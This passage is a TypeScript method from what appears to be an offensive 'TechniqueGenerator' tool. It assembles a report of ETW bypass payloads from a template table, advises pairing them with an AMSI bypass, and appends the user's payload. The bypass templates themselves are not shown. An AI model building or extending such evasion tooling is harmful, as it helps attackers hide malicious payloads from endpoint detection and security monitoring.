
  private generateETW(payload: string, edrType?: string): string {
    const lines: string[] = ['[TechniqueGenerator] ETW Bypass Payloads', '═'.repeat(50), '']
    lines.push(`## ETW Bypass (${edrType || 'unknown EDR'})`)
    lines.push('Combine with AMSI bypass for full coverage.')
    lines.push('')

    let idx = 1
    for (const [name, template] of Object.entries(ETW_BYPASS_TEMPLATES)) {
      lines.push(`### Method ${idx}: ${name}`)
      lines.push(template)
      lines.push('')
      idx++
    }

    lines.push(`Original payload: ${payload}`)
    return lines.join('\n')
  }
}
